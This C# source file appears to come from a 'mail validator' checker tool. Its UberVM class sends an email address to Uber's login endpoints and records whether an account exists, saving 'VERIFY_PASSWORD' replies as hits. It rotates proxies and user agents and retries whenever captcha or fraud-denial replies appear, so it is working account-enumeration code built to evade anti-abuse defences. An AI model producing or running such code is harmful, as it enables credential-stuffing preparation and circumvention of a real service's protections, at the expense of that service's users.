using System;
using Leaf.xNet;
using CheckerSimplefied;
using System.Drawing;
using System.Net;

namespace SC___Mail_Validator
{
    class UberVM
    {
        public static void postRequests(string username)
        {
            Utilities.name = "Uber";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/x-www-form-urlencoded");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "referer: https://www.ubereats.com/");
                        string url = "https://auth.uber.com/login/session";
                        var response = request.Raw(HttpMethod.GET, url);
                        string csrf = response["x-csrf-token"];
                        var cookies = request.Cookies.GetCookies("https://auth.uber.com/login/session");
                        foreach (Cookie cookie in cookies)
                        {
                            if(cookie.Name == "arch-frontend:sess")
                            {
                                session = cookie.Value;
                            }
                        }

                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/json");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "origin: https://auth.uber.com");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "cookie: arch-frontend:sess=" + session);
                        AmelioratedWrapper.AddHeaderWithStyle(request, "x-csrf-token: " + csrf);
                        string urlPost = "https://auth.uber.com/login/handleanswer";
                        var responsePost = request.Raw(HttpMethod.POST, urlPost, (HttpContent)new StringContent("{\"answer\":{\"type\":\"VERIFY_INPUT_EMAIL\",\"userIdentifier\":{\"email\":\"" + username + "\"}},\"init\":true}")).ToString();

                        if (responsePost.Contains("EMAIL_NOT_FOUND"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                        if (responsePost.Contains("VERIFY_PASSWORD"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (responsePost.Contains("RECAPTCHA") || responsePost.Contains("FRAUD_LOGIN_DENIED") || responsePost.Contains("ACCESS_DENIED"))
                        {
                            Utilities.catchRetry();
                            continue;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
        public static string session;
    }
}
